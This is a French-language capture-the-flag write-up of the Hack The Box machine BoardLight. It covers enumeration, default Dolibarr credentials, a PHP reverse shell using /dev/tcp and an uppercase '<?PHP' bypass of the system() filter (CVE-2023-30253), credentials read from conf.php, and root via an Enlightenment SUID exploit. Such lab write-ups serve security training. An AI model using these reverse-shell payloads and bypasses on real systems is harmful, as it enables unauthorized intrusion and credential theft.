---
date: 2024-09-27T22:53:03-05:00
# description: ""
image: "/images/HTB-BoardLight/BoardLight.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: BoardLight"
type: "post"
---

* Platforme: Hack The Box
* Lien: [BoardLight](https://app.hackthebox.com/machines/BoardLight)
* Niveau: Facile
* OS: Linux
---

BoardLight débute par la découverte d'un sous-domaine où se trouve une instance Dolibarr, à laquelle nous accédons en utilisant les informations d'identification par défaut. Grâce à un reverse shell PHP couplé à une technique de manipulation des majuscules, nous obtenons notre accès initial. Nous découvrons ensuite un fichier de configuration contenant des identifiants qui nous permettent de prendre le contrôle d'un autre compte. Enfin, nous obtenons les privilèges root en exploitant une vulnérabilité dans Enlightenment.

Address IP cible - `10.10.11.11`

## Balayage

```
./nmap_scan.sh 10.10.11.11 BoardLight
```

**Resultats**

```shell
Running detailed scan on open ports: 22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-21 23:01 CDT
Nmap scan report for 10.10.11.11
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
Service Info: Host: board.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.05 seconds
```

Notre scan révèle deux ports ouverts: SSH (22) et HTTP (80), nous ajoutons également `board.htb` au fichier `hosts` pour faciliter l'énumération.

## Enumération

À `http://board.htb/`, nous trouvons un site web pour une société de conseil en cybersécurité. Les boutons ne fonctionnent pas et il n'y a rien de vraiment marquant. 

![BoardLight website](/images/HTB-BoardLight/boardlight_website.png)

Nous essayons de trouver des répertoires cachés mais rien d'intéressant n'est trouvé.

```
gobuster dir -u http://board.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
![Directory bruteforcing](/images/HTB-BoardLight/gobuster_cmd.png)

Avec l'énumération des sous-domaines, nous trouvons un sous-domaine valide appelé `crm`.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://board.htb -H "Host: FUZZ.board.htb" -ic -fs 15949
```

![Subdomain enumeration](/images/HTB-BoardLight/ffuf_cmd.png)

Sur `http://crm.board.htb/` nous trouvons une page de connexion pour [Dolibarr](https://www.dolibarr.org/).

![Dolibarr ERP](/images/HTB-BoardLight/crm_board.png)

Une simple recherche Google nous permet de découvrir que les identifiants par défaut des instances Dolibarr sont `admin:admin` et en les utilisant nous accédons au tableau de bord.

![Dolibarr default credentials](/images/HTB-BoardLight/Dolibarr_default_creds.png)

![Dolibarr dashboard](/images/HTB-BoardLight/dolibarr_dashboard.png)

Bien que les systèmes CRM, CMS et ERP aient des objectifs différents, ils présentent souvent une vulnérabilité commune: une fois connecté, il est souvent possible d'obtenir un shell en exécutant un code malveillant.

Dans la section `Websites`, nous créons un nouveau site web.

![Dolibarr new website](/images/HTB-BoardLight/new_website.png)

Ensuite, créons une page.

![Dolibarr new page](/images/HTB-BoardLight/new_page.png)

Après la création de la page, il y a un bouton `Edit HTML Source` que nous pouvons utiliser pour ajouter notre code.

![Edit HTML source button](/images/HTB-BoardLight/edit_source.png)

Nous essayons un reverse shell php basique.

```php
<?php system('/bin/bash -c "/bin/bash -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1"') ?>
```

![Dolibarr reverse shell](/images/HTB-BoardLight/rev_shell1.png)

Après avoir essayé de sauvegarder le code, nous obtenons une erreur, il semble que nous ne puissions pas utiliser `system`. A partir de là, nous pouvons soit trouver une autre méthode pour obtenir un shell, soit essayer de contourner la mesure de sécurité.

![Dolibarr php system error](/images/HTB-BoardLight/error_dolibarr.png)

## Accès Initial

En recherchant les vulnérabilités de Dolibarr, nous trouvons [cette page](https://www.vicarius.io/vsociety/posts/exploiting-rce-in-dolibarr-cve-2023-30253-30254) pour le `CVE-2023-30253` qui nous permet d'obtenir une exécution de code à distance en utilisant une manipulation de majuscules.

Réessayons avec le php en majuscules (PHP).

```php
<?PHP system('/bin/bash -c "/bin/bash -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1"') ?>
```

![Dolibarr RCE](/images/HTB-BoardLight/Dolibar_rce.png)

Après avoir sauvegardé le code modifié, nous obtenons un shell sous le nom de `www-data`.

![foothold shell](/images/HTB-BoardLight/foothold.png)

En consultant le fichier `passwd`, nous remarquons la présence d'un utilisateur appelé `larissa` et, bien sûr, nous ne pouvons pas accéder à son répertoire personnel.

![larissa user](/images/HTB-BoardLight/larissa_user.png)

Grâce à linpeas, nous trouvons un répertoire de configuration à `/var/www/html/crm.board.htb/htdocs/conf/`.

![linpeas results](/images/HTB-BoardLight/linpeas_results.png)

![conf directory](/images/HTB-BoardLight/conf_directory.png)

En examinant le contenu de `conf.php`, nous obtenons des identifiants.

![dolibar conf credentials](/images/HTB-BoardLight/dolibarr_creds.png)

Avec le mot de passe trouvé, nous accédons au compte de larissa via SSH et nous trouvons le fichier `user.txt` dans son répertoire personnel.

![user flag](/images/HTB-BoardLight/user_flag.png)

## Elévation de Privilèges

Malheureusement, larissa n'est pas autorisée à exécuter sudo.

![sudo command](/images/HTB-BoardLight/sudo_cmd.png)

Exécutons à nouveau linpeas pour trouver des pistes d'escalade de privilèges. Nous trouvons un fichier appelé `enlightenment` appartenant à root avec le bit SUID activé et une référence au [CVE-2022-37706](https://nvd.nist.gov/vuln/detail/CVE-2022-37706).

![SUID on enlightenment binary](/images/HTB-BoardLight/suid-file.png)

[Ici](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/tree/main) nous trouvons un PoC pour la vulnérabilité. Après avoir exécuté le script (exploit.sh) sur la cible, nous obtenons les privilèges root et `root.txt` est accessible dans `/root`.

![root flag](/images/HTB-BoardLight/root_flag.png)

Merci d'avoir pris le temps de lire cet article!

